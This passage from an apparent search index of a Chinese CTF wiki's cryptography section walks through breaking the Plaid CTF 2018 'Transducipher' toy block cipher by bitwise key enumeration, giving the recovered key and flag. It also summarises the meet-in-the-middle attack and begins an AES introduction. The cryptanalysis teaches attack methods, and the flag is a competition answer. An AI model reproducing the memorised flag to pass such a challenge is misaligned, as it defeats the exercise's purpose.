bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) def transduceblock ( b ): return bin2block ( transduce ( block2bin ( b ))) def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) class Transducipher : def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b if __name__ == \"__main__\" : flag = bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )) k = int ( flag , 16 ) C = Transducipher ( k ) print ( \"Your flag is PCTF{ %s }\" % flag ) with open ( \"data1.txt\" , \"w\" ) as f : for i in range ( 16 ): pt = int ( bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )), 16 ) ct = C . encrypt ( pt ) f . write ( str (( pt , ct )) + \" \\n \" ) \u9898\u76ee\u7ed9\u4e86 16 \u7ec4\u660e\u5bc6\u6587\u5bf9 \u660e\u6587\u5927\u5c0f 8 \u4e2a\u5b57\u8282 \u5bc6\u6587\u5927\u5c0f 8 \u4e2a\u5b57\u8282 \u5bc6\u94a5\u5927\u5c0f\u4e5f\u662f 8 \u4e2a\u5b57\u8282 \u6211\u4eec\u6240\u9700\u8981\u6c42\u89e3\u7684\u5c31\u662f\u5bc6\u94a5\u3002 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u4e3b\u8981\u6709\u4e24\u79cd\u57fa\u672c\u64cd\u4f5c swap def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) \u5c06\u7ed9\u5b9a\u7684\u6570\u636e\u7684\u9ad8 32 \u4f4d\u4e0e\u4f4e 32 \u4f4d\u4ea4\u6362\u3002 transduce T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) \u5176\u4e2d\uff0c b \u662f\u4e00\u4e2a 01 \u6570\u7ec4\uff0c\u521d\u59cb\u65f6\u523b\u5927\u5c0f\u4e3a 64\u3002 s \u662f\u4e00\u4e2a\u4e0b\u6807\u3002 \u57fa\u672c\u6d41\u7a0b\u5982\u4e0b \u6839\u636e s \u9009\u62e9\u4f7f\u7528 T \u7684\u54ea\u4e2a\u5143\u7d20\uff0c\u8fdb\u800c\u5c06\u5176\u5206\u4e3a d \u548c t\u3002 \u5c06 b \u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u53ea\u5305\u542b\u5934\u5143\u7d20\uff0c\u53e6\u4e00\u90e8\u5206\u5305\u542b\u5176\u5b83\u7684\u5143\u7d20\u3002 \u5c06\u5934\u5143\u7d20\u4e0e t \u5f02\u6216\u4f5c\u4e3a\u5f53\u524d\u7684\u5934\u5143\u7d20\uff0c\u7136\u540e\u7ee7\u7eed\u8f6c\u6362\u5269\u4e0b\u7684\u90e8\u5206\u3002 \u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u51fd\u6570\u8f6c\u6362\u4e3a\u8fed\u4ee3\u51fd\u6570 def transduce_iter ( b , s = 0 ): ans = [] for c in b : d , t = T [ s ] ans += [ c ^ t ] s = d [ c ] return ans \u8fdb\u800c\u7531\u4e8e\u6bcf\u6b21\u5904\u7406\u7684\u662f\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u5176\u5b9e\u8be5\u51fd\u6570\u662f\u53ef\u9006\u7684\uff0c\u5982\u4e0b def invtransduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ^ t ]) \u4e0b\u9762\u5206\u6790\u7a0b\u5e8f\u7684\u6838\u5fc3\u6d41\u7a0b\uff0c\u9996\u5148\u662f\u751f\u6210\u5bc6\u94a5\u90e8\u5206\uff0c\u8be5\u52a0\u5bc6\u7b97\u6cd5\u751f\u6210\u4e86 6 \u4e2a\u5bc6\u94a5\uff0c\u6bcf\u6b21\u751f\u6210\u7684\u65b9\u6cd5 transduce \u5148\u524d\u7684\u5bc6\u94a5\u5f97\u5230\u4e2d\u95f4\u503c t \u5bf9 t \u8fdb\u884c swap \u8fde\u7eed\u8fed\u4ee3 5 \u6b21 def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) \u52a0\u5bc6\u7b97\u6cd5\u5982\u4e0b\uff0c\u4e00\u5171\u8fed\u4ee3 6 \u8f6e\uff0c\u57fa\u672c\u6d41\u7a0b \u5f02\u6216\u5bc6\u94a5 transduce \u4ea4\u6362 def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b \u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u77e5\u8be5\u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u4e2a\u5757\u52a0\u5bc6\uff0c\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u5757\u5927\u5c0f\u4e3a 8 \u4e2a\u5b57\u8282 \u8f6e\u6570\u4e3a 6 \u8f6e \u52a0\u5bc6\u7b97\u6cd5\u7684\u6bcf\u8f6e\u7684\u57fa\u672c\u64cd\u4f5c\u4e3a transduce \u548c swap\u3002 \u5bc6\u94a5\u7684\u6269\u5c55\u4e5f\u662f\u4e0e transduce \u548c swap \u76f8\u5173\u3002 \u66f4\u5177\u4f53\u7684 swap \u662f\u5c06 8 \u5b57\u8282\u7684\u9ad8 32 \u4f4d\u4e0e\u4f4e 32 \u4f4d\u8fdb\u884c\u8c03\u6362\u3002 transduce \u662f\u5bf9\u4e8e 8 \u5b57\u8282\u7684\u6bcf\u4e2a\u6bd4\u7279\uff0c\u9010\u6bd4\u7279\u4e0e\u67d0\u4e2a\u503c\u8fdb\u884c\u5f02\u6216\u3002\u8fd9\u4e2a\u503c\u4e0e T \u6709\u5173\u3002 \u901a\u8fc7\u8fdb\u4e00\u6b65\u5730\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u51fd\u6570\u90fd\u662f\u53ef\u9006\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u6700\u540e\u7684\u5bc6\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u5c06\u539f\u6765\u7684\u8f6e\u6570\u7f29\u77ed\u4e3a\u5dee\u4e0d\u591a 5 \u8f6e\uff0c\u56e0\u4e3a\u6700\u540e\u4e00\u8f6e\u7684 transduce \u548c swap \u6ca1\u6709\u4f5c\u7528\u4e86\u3002 \u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u5982\u4e0b\u53d8\u91cf \u540d\u5b57 \u542b\u4e49 k_{i,0} k_{i,0} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u7684\u9ad8 32 \u4f4d k_{i,1} k_{i,1} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u7684\u4f4e 32 \u4f4d d_{i,0} d_{i,0} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u8f93\u5165\u7684\u9ad8 32 \u4f4d d_{i,1} d_{i,1} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u8f93\u5165\u7684\u4f4e 32 \u4f4d \u7531\u4e8e\u5176\u4e2d\u6709\u4e00\u4e2a\u6838\u5fc3\u64cd\u4f5c\u662f swap\uff0c\u53ea\u4f1a\u64cd\u7eb5\u9ad8\u6216\u4f4e 32 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5206\u4e3a\u4e24\u90e8\u5206\u8003\u8651\u3002\u7b80\u5316\u5b9a\u4e49\u5982\u4e0b Transduce \u7b80\u5316\u4e3a T\uff0c\u8fd9\u91cc\u867d\u7136\u4e0e\u6e90\u4ee3\u7801\u91cc\u51b2\u7a81\uff0c\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u6682\u65f6\u7406\u89e3\u4e00\u4e0b\u3002 Swap \u7b80\u5316\u4e3a S\u3002 \u5219\u6bcf\u4e00\u8f6e\u7684\u660e\u5bc6\u6587\uff0c\u5bc6\u94a5\u5982\u4e0b \u8f6e\u6570 \u5de6\u4fa7\u5bc6\u94a5 \u5de6\u4fa7\u5bc6\u6587 \u53f3\u4fa7\u5bc6\u94a5 \u53f3\u4fa7\u5bc6\u6587 0 k_{0,0} k_{0,0} d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) k_{0,1} k_{0,1} d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) 1 k_{1,0}=T(k_{0,1},s) k_{1,0}=T(k_{0,1},s) d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) k_{1,1}=T(k_{0,0}) k_{1,1}=T(k_{0,0}) d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) 2 k_{2,0}=T(k_{1,1},s) k_{2,0}=T(k_{1,1},s) d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) k_{2,1}=T(k_{1,0}) k_{2,1}=T(k_{1,0}) d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) 3 k_{3,0}=T(k_{2,1},s) k_{3,0}=T(k_{2,1},s) d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) k_{3,1}=T(k_{2,0}) k_{3,1}=T(k_{2,0}) d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) 4 k_{4,0}=T(k_{3,1},s) k_{4,0}=T(k_{3,1},s) d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) k_{4,1}=T(k_{3,0}) k_{4,1}=T(k_{3,0}) d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) 5 k_{5,0}=T(k_{4,1},s) k_{5,0}=T(k_{4,1},s) d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) k_{5,1}=T(k_{4,0}) k_{5,1}=T(k_{4,0}) d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) \u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u9010\u6bd4\u7279\u4f4d\u679a\u4e3e k \u7684\u9ad8 32 \u4f4d\uff0c\u540c\u65f6\u679a\u4e3e\u5728\u8fdb\u884c T \u64cd\u4f5c\u65f6\u7684\u53ef\u80fd\u7684 s \u72b6\u6001\u4f4d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u83b7\u53d6\u9ad8 32 \u4f4d\u5bc6\u94a5\u3002\u5728\u8fdb\u884c\u9010\u4f4d\u7206\u7834\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u83b7\u53d6\u4e24\u4e2a\u53ef\u80fd\u7ed3\u679c [2659900894, 2659900895] \u518d\u6839\u636e\u5de6\u8fb9\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u53bb\u83b7\u53d6\u53f3\u8fb9\u53ef\u80fd\u7684\u7ed3\u679c\uff0c\u5229\u7528 2659900894 \u83b7\u53d6\u7684\u53ef\u80fd\u7684\u7ed3\u679c\u5982\u4e0b # \u7b2c\u4e00\u7ec4\u660e\u5bc6\u6587\u5bf9\u5bf9\u5e94\u7684\u5bc6\u94a5\u53ef\u80fd\u592a\u591a\u3002 # \u7b2c\u4e8c\u7ec4\u4e00\u5171 6 \u4e2a\u3002 [2764038144, 2764038145, 2764038152, 2764038153, 2764038154, 2764038155] # \u7b2c\u4e09\u7ec4 [2764038144, 2764038145] \u7136\u540e\u5176\u5b9e\u6211\u4eec\u5c31\u53ef\u4ee5\u624b\u5de5\u8bd5\u4e00\u4e0b\u52a0\u5bc6\u6240\u6709\u7684\u660e\u5bc6\u6587\uff0c\u5982\u679c\u4e0d\u5bf9\uff0c\u5c31\u76f4\u63a5\u5224\u65ad\u9519\u8bef\u5373\u53ef\u4e86\u3002\u8fd9\u6837\u5176\u5b9e\u53ef\u4ee5\u5f88\u5feb\u53ef\u4ee5\u8fc7\u6ee4\u3002\u6700\u540e\u53ef\u4ee5\u53d1\u73b0\u5bc6\u94a5\u662f 2659900894|2764038145 \u4e5f\u5c31\u662f11424187353095200769\u3002\u4e5f\u5c31\u62ff\u5230\u4e86 flag\u3002 \u5f53\u7136\uff0c\u672c\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e2d\u95f4\u76f8\u9047\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u8bf4\u5206\u522b\u679a\u4e3e\u7b2c 0 \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u548c\u6700\u540e\u4e00\u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u4f7f\u5176\u5728\u7b2c\u4e09\u8f6e\u76f8\u9047\u4ea7\u751f\u78b0\u649e\u3002","title":"2018 Plaid CTF transducipher"},{"location":"crypto/attack-summary/bit-attack/#_3","text":"http://blog.rb-tree.xyz/2018/05/07/plaidctf-2018-transducipher/","title":"\u53c2\u8003"},{"location":"crypto/attack-summary/meet-in-the-middle/","text":"\u4e2d\u95f4\u76f8\u9047\u653b\u51fb - MITM \u00b6 \u6982\u8ff0 \u00b6 \u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u662f\u4e00\u79cd\u4ee5\u7a7a\u95f4\u6362\u53d6\u65f6\u95f4\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u6cd5\uff0c1977\u5e74\u7531 Diffie \u4e0e Hellman \u63d0\u51fa\u3002\u4ece\u4e2a\u4eba\u89d2\u5ea6\u770b\uff0c\u8005\u66f4\u591a\u5730\u6307\u4e00\u79cd\u601d\u60f3\uff0c\u4e0d\u4ec5\u4ec5\u9002\u7528\u4e8e\u5bc6\u7801\u5b66\u653b\u51fb\uff0c\u4e5f\u9002\u7528\u4e8e\u5176\u4ed6\u65b9\u9762\uff0c\u53ef\u4ee5\u964d\u4f4e\u7b97\u6cd5\u7684\u590d\u6742\u5ea6\u3002 \u57fa\u672c\u539f\u7406\u5982\u4e0b \u5047\u8bbe E \u548c D \u5206\u522b\u662f\u52a0\u5bc6\u51fd\u6570\u548c\u89e3\u5bc6\u51fd\u6570\uff0ck1 \u548c k2 \u5206\u522b\u662f\u4e24\u6b21\u52a0\u5bc6\u4f7f\u7528\u7684\u5bc6\u94a5\uff0c\u5219\u6211\u4eec\u6709 C=E_{k_2}(E_{k_1}(P)) C=E_{k_2}(E_{k_1}(P)) P=D_{k_2}(D_{k_1}(C)) P=D_{k_2}(D_{k_1}(C)) \u5219\u6211\u4eec\u53ef\u4ee5\u63a8\u51fa E_{k_1}(P)=D_{k_2}(C) E_{k_1}(P)=D_{k_2}(C) \u90a3\u4e48\uff0c\u5f53\u7528\u6237\u77e5\u9053\u4e00\u5bf9\u660e\u6587\u548c\u5bc6\u6587\u65f6 \u653b\u51fb\u8005\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684 k1\uff0c\u5c06 P \u6240\u6709\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5b58\u50a8\u8d77\u6765\uff0c\u5e76\u6309\u7167\u5bc6\u6587\u7684\u5927\u5c0f\u8fdb\u884c\u6392\u5e8f\u3002 \u653b\u51fb\u8005\u8fdb\u4e00\u6b65\u679a\u4e3e\u6240\u6709\u7684k2\uff0c\u5c06\u5bc6\u6587 C \u8fdb\u884c\u89e3\u5bc6\u5f97\u5230 C1\uff0c\u5728\u7b2c\u4e00\u6b65\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4e2d\u641c\u7d22 C1\uff0c\u5982\u679c\u641c\u7d22\u5230\uff0c\u5219\u6211\u4eec\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u627e\u5230\u4e86\u6b63\u786e\u7684 k1 \u548c k2\u3002 \u5982\u679c\u89c9\u5f97\u7b2c\u4e8c\u6b65\u4e2d\u5f97\u5230\u7684\u7ed3\u679c\u4e0d\u4fdd\u9669\uff0c\u5219\u6211\u4eec\u8fd8\u53ef\u4ee5\u518d\u627e\u4e00\u4e9b\u660e\u5bc6\u6587\u5bf9\u8fdb\u884c\u9a8c\u8bc1\u3002 \u5047\u8bbe k1 \u548c k2 \u7684\u5bc6\u94a5\u957f\u5ea6\u90fd\u4e3a n\uff0c\u5219\u539f\u5148\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u9700\u8981 O(n^2) O(n^2) \uff0c\u73b0\u5728\u6211\u4eec\u53ea\u9700\u8981 O(n log_2n) O(n log_2n) \u3002 \u8fd9\u4e0e 2DES \u7684\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u7c7b\u4f3c\u3002 \u9898\u76ee \u00b6 2018 \u56fd\u8d5b Crackmec\uff0c\u53c2\u89c1 Wiki AES \u90e8\u5206 2018 Plaid CTF Transducipher\uff0c\u53c2\u89c1\u6bd4\u7279\u653b\u51fb\u90e8\u5206\u7684\u539f\u7406\u3002 2018 \u56fd\u8d5b Crackme java\uff0c\u53c2\u89c1 Wiki \u6574\u6570\u57df\u4e0a\u7684\u79bb\u6563\u5bf9\u6570\u90e8\u5206 2018 WCTF RSA\uff0c\u53c2\u89c1 wiki RSA Complex \u90e8\u5206 \u53c2\u8003\u6587\u732e \u00b6 https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%80%94%E7%9B%B8%E9%81%87%E6%94%BB%E6%93%8A","title":"\u4e2d\u95f4\u76f8\u9047\u653b\u51fb - MITM"},{"location":"crypto/attack-summary/meet-in-the-middle/#-mitm","text":"","title":"\u4e2d\u95f4\u76f8\u9047\u653b\u51fb - MITM"},{"location":"crypto/attack-summary/meet-in-the-middle/#_1","text":"\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u662f\u4e00\u79cd\u4ee5\u7a7a\u95f4\u6362\u53d6\u65f6\u95f4\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u6cd5\uff0c1977\u5e74\u7531 Diffie \u4e0e Hellman \u63d0\u51fa\u3002\u4ece\u4e2a\u4eba\u89d2\u5ea6\u770b\uff0c\u8005\u66f4\u591a\u5730\u6307\u4e00\u79cd\u601d\u60f3\uff0c\u4e0d\u4ec5\u4ec5\u9002\u7528\u4e8e\u5bc6\u7801\u5b66\u653b\u51fb\uff0c\u4e5f\u9002\u7528\u4e8e\u5176\u4ed6\u65b9\u9762\uff0c\u53ef\u4ee5\u964d\u4f4e\u7b97\u6cd5\u7684\u590d\u6742\u5ea6\u3002 \u57fa\u672c\u539f\u7406\u5982\u4e0b \u5047\u8bbe E \u548c D \u5206\u522b\u662f\u52a0\u5bc6\u51fd\u6570\u548c\u89e3\u5bc6\u51fd\u6570\uff0ck1 \u548c k2 \u5206\u522b\u662f\u4e24\u6b21\u52a0\u5bc6\u4f7f\u7528\u7684\u5bc6\u94a5\uff0c\u5219\u6211\u4eec\u6709 C=E_{k_2}(E_{k_1}(P)) C=E_{k_2}(E_{k_1}(P)) P=D_{k_2}(D_{k_1}(C)) P=D_{k_2}(D_{k_1}(C)) \u5219\u6211\u4eec\u53ef\u4ee5\u63a8\u51fa E_{k_1}(P)=D_{k_2}(C) E_{k_1}(P)=D_{k_2}(C) \u90a3\u4e48\uff0c\u5f53\u7528\u6237\u77e5\u9053\u4e00\u5bf9\u660e\u6587\u548c\u5bc6\u6587\u65f6 \u653b\u51fb\u8005\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684 k1\uff0c\u5c06 P \u6240\u6709\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5b58\u50a8\u8d77\u6765\uff0c\u5e76\u6309\u7167\u5bc6\u6587\u7684\u5927\u5c0f\u8fdb\u884c\u6392\u5e8f\u3002 \u653b\u51fb\u8005\u8fdb\u4e00\u6b65\u679a\u4e3e\u6240\u6709\u7684k2\uff0c\u5c06\u5bc6\u6587 C \u8fdb\u884c\u89e3\u5bc6\u5f97\u5230 C1\uff0c\u5728\u7b2c\u4e00\u6b65\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4e2d\u641c\u7d22 C1\uff0c\u5982\u679c\u641c\u7d22\u5230\uff0c\u5219\u6211\u4eec\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u627e\u5230\u4e86\u6b63\u786e\u7684 k1 \u548c k2\u3002 \u5982\u679c\u89c9\u5f97\u7b2c\u4e8c\u6b65\u4e2d\u5f97\u5230\u7684\u7ed3\u679c\u4e0d\u4fdd\u9669\uff0c\u5219\u6211\u4eec\u8fd8\u53ef\u4ee5\u518d\u627e\u4e00\u4e9b\u660e\u5bc6\u6587\u5bf9\u8fdb\u884c\u9a8c\u8bc1\u3002 \u5047\u8bbe k1 \u548c k2 \u7684\u5bc6\u94a5\u957f\u5ea6\u90fd\u4e3a n\uff0c\u5219\u539f\u5148\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u9700\u8981 O(n^2) O(n^2) \uff0c\u73b0\u5728\u6211\u4eec\u53ea\u9700\u8981 O(n log_2n) O(n log_2n) \u3002 \u8fd9\u4e0e 2DES \u7684\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u7c7b\u4f3c\u3002","title":"\u6982\u8ff0"},{"location":"crypto/attack-summary/meet-in-the-middle/#_2","text":"2018 \u56fd\u8d5b Crackmec\uff0c\u53c2\u89c1 Wiki AES \u90e8\u5206 2018 Plaid CTF Transducipher\uff0c\u53c2\u89c1\u6bd4\u7279\u653b\u51fb\u90e8\u5206\u7684\u539f\u7406\u3002 2018 \u56fd\u8d5b Crackme java\uff0c\u53c2\u89c1 Wiki \u6574\u6570\u57df\u4e0a\u7684\u79bb\u6563\u5bf9\u6570\u90e8\u5206 2018 WCTF RSA\uff0c\u53c2\u89c1 wiki RSA Complex \u90e8\u5206","title":"\u9898\u76ee"},{"location":"crypto/attack-summary/meet-in-the-middle/#_3","text":"https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%80%94%E7%9B%B8%E9%81%87%E6%94%BB%E6%93%8A","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/basic/introduction/","text":"\u57fa\u7840\u6570\u5b66\u77e5\u8bc6 \u00b6 \u672c\u90e8\u5206\u4f1a\u4ecb\u7ecd\u201c\u57fa\u7840\u6570\u5b66\u77e5\u8bc6\u201d\uff0c\u8fd9\u91cc\u52a0\u4e86\u5f15\u53f7\uff0c\u6240\u4ee5\u5e76\u4e0d\u89c1\u5f97\u771f\u7684\u5f88\u57fa\u7840\u3002\u3002","title":"\u57fa\u7840\u6570\u5b66\u77e5\u8bc6"},{"location":"crypto/basic/introduction/#_1","text":"\u672c\u90e8\u5206\u4f1a\u4ecb\u7ecd\u201c\u57fa\u7840\u6570\u5b66\u77e5\u8bc6\u201d\uff0c\u8fd9\u91cc\u52a0\u4e86\u5f15\u53f7\uff0c\u6240\u4ee5\u5e76\u4e0d\u89c1\u5f97\u771f\u7684\u5f88\u57fa\u7840\u3002\u3002","title":"\u57fa\u7840\u6570\u5b66\u77e5\u8bc6"},{"location":"crypto/blockcipher/aes/","text":"AES \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 Advanced Encryption Standard\uff08AES\uff09\uff0c\u9ad8\u7ea7\u52a0\u5bc6\u6807\u51c6\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u88ab\u8bbe\u8ba1\u6765\u53d6\u4ee3 DES\uff0c\u7531 Joan Daemen \u548c Vincent Rijmen \u6240\u8bbe\u8ba1\u3002\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u8f93\u5165\uff1a128 \u6bd4\u7279\u3002 \u8f93\u51fa\uff1a128 \u6bd4\u7279\u3002 SPN \u7f51\u7edc\u7ed3\u6784\u3002 \u5176\u8fed\u4ee3\u8f6e\u6570\u4e0e\u5bc6\u94a5\u957f\u5ea6\u6709\u5173\u7cfb\uff0c\u5982\u4e0b \u5bc6\u94a5\u957f\u5ea6\uff08\u6bd4\u7279\uff09 \u8fed\u4ee3\u8f6e\u6570 128 10 192 12 256 14 \u57fa\u672c\u6d41\u7a0b \u00b6 \u57fa\u672c\u6982\u5ff5 \u00b6 \u5728 AES \u52a0\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u4e00\u5757\u90fd\u662f 128 \u6bd4\u7279\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u660e\u786e\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5\u3002 \u5728 AES \u4e2d\uff0c\u5757\u4e0e State \u4e4b\u95f4\u7684\u8f6c\u6362\u8fc7\u7a0b\u5982\u4e0b \u6240\u4ee5\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u6bcf\u4e00\u4e2a block \u4e2d\u7684\u5b57\u8282\u662f\u6309\u7167\u5217\u6392\u5217\u8fdb\u5165\u5230\u72b6\u6001\u6570\u7ec4\u7684\u3002 \u800c\u5bf9\u4e8e\u660e\u6587\u6765\u8bf4\uff0c\u4e00\u822c\u6211\u4eec\u4f1a\u9009\u62e9\u4f7f\u7528\u5176\u5341\u516d\u8fdb\u5236\u8fdb\u884c\u7f16\u7801\u3002 \u52a0\u89e3\u5bc6\u8fc7\u7a0b \u00b6 \u8fd9\u91cc\u7ed9\u4e2a\u770b\u96ea\u4e0a\u6bd4\u8f83\u597d\u7684 \u56fe\u4f8b \uff0c\u4ee5\u4fbf\u4e8e\u4ecb\u7ecd\u57fa\u672c\u7684\u6d41\u7a0b\uff0c\u6bcf\u4e00\u8f6e\u4e3b\u8981\u5305\u62ec \u8f6e\u5bc6\u94a5\u52a0\uff0cAddRoundKey \u5b57\u8282\u66ff\u6362\uff0cSubBytes \u884c\u79fb\u4f4d\uff0cShiftRows \u5217\u6df7\u6dc6\uff0cMixColumns \u4e0a\u9762\u7684\u5217\u6df7\u6dc6\u7684\u77e9\u9635\u4e58\u6cd5\u7b49\u53f7\u5de6\u8fb9\u7684\u5217\u5411\u91cf\u5e94\u8be5\u5728\u53f3\u8fb9\u3002 \u8fd9\u91cc\u518d\u7ed9\u4e00\u5f20\u5176\u52a0\u89e3\u5bc6\u7684\u5168\u56fe\uff0c\u5176\u89e3\u5bc6\u7b97\u6cd5\u7684\u6b63\u786e\u6027\u5f88\u663e\u7136\u3002 \u6211\u4eec\u8fd9\u91cc\u91cd\u70b9\u5173\u6ce8\u4e00\u4e0b\u4ee5\u4e0b\u3002 \u5b57\u8282\u66ff\u6362 \u00b6 \u5728\u5b57\u8282\u66ff\u6362\u7684\u80cc\u540e\uff0c\u5176\u5b9e\u662f\u6709\u5bf9\u5e94\u7684\u6570\u5b66\u89c4\u5219\u6765\u5b9a\u4e49\u5bf9\u5e94\u7684\u66ff\u6362\u8868\u7684\uff0c\u5982\u4e0b \u8fd9\u91cc\u7684\u8fd0\u7b97\u5747\u5b9a\u4e49\u5728 GF(2^8) GF(2^8) \u5185\u3002 \u5217\u6df7\u6dc6 \u00b6 \u8fd9\u91cc\u7684\u8fd0\u7b97\u4e5f\u662f\u5b9a\u4e49\u5728 GF(2^8) GF(2^8) \u4e0a\uff0c\u4f7f\u7528\u7684\u6a21\u591a\u9879\u5f0f\u4e3a x^8+x^4+x^3+1 x^8+x^4+x^3+1 \u3002 \u5bc6\u94a5\u6269\u5c55 \u00b6 \u7b49\u4ef7\u89e3\u5bc6\u7b97\u6cd5 \u00b6 \u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 \u4ea4\u6362\u9006\u5411\u884c\u79fb\u4f4d\u548c\u9006\u5411\u5b57\u8282\u4ee3\u66ff\u5e76\u4e0d\u5f71\u54cd\u7ed3\u679c\u3002 \u4ea4\u6362\u8f6e\u5bc6\u94a5\u52a0\u548c\u9006\u5411\u5217\u6df7\u6dc6\u5e76\u4e0d\u5f71\u54cd\u7ed3\u679c\uff0c\u5173\u952e\u5728\u4e8e \u9996\u5148\u53ef\u4ee5\u628a\u5f02\u6216\u770b\u6210\u57df\u4e0a\u7684\u591a\u9879\u5f0f\u52a0\u6cd5 \u7136\u540e\u591a\u9879\u5f0f\u4e2d\u4e58\u6cd5\u5bf9\u52a0\u6cd5\u5177\u6709\u5206\u914d\u7387\u3002 \u653b\u51fb\u65b9\u6cd5 \u00b6 \u79ef\u5206\u653b\u51fb 2018 \u56fd\u8d5b Crackmec \u00b6 